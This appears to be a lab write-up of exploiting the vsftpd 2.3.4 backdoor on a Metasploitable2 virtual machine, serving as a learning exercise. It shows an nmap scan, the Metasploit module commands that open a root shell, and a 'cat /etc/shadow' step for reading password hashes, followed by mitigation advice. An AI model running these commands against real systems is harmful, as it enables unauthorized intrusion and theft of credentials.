
#  VSFTPD Backdoor Exploitation (Metasploitable2)

##  Objective
The goal of this exercise was to identify and exploit a known vulnerability in the VSFTPD 2.3.4 service running on a target machine using basic reconnaissance and exploitation techniques.

---

##  Target Information
- Target IP:192.168.190.128
- Service: vsftpd 2.3.4
- Environment: Metasploitable2 (lab environment)

---

##  Reconnaissance

I performed a stealth and version-based Nmap scan using SYN scan and service detection to identify open ports and running services on the target machine.

```bash
nmap -sS -sV 192.168.190.128
Results:
Port 21/tcp: FTP (vsftpd 2.3.4)

The scan revealed that an outdated and vulnerable version of VSFTPD was running on the FTP service.

## Vulnerability Identification

VSFTPD 2.3.4 is known to contain a backdoor vulnerability that can allow remote code execution under specific conditions.

Further research confirmed that this version is publicly documented as vulnerable and exploitable using Metasploit.

## Exploitation

I used Metasploit to exploit the vulnerability.

msfconsole

Then selected the appropriate exploit module:

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.190.128
set RPORT 21
run

## Result

The exploit was successful and provided a remote shell on the target system.

## Remote shell

whoami

Result:

root

This confirmed full system compromise of the target machine.

## Post-Exploitation

After gaining root access, I explored sensitive system files.

I navigated to the /etc directory and accessed the shadow file:

cat /etc/shadow
 Impact:

The /etc/shadow file contains hashed passwords for all system users. Access to this file represents a critical security issue, as it could potentially allow offline password cracking.

## Security Implications

This vulnerability demonstrates how an outdated service can lead to full system compromise.

Key risks include:

Remote code execution via a known backdoor
Unauthorized root access
Exposure of sensitive authentication data

Proper mitigation includes:

Keeping services up to date
Removing unused or insecure services
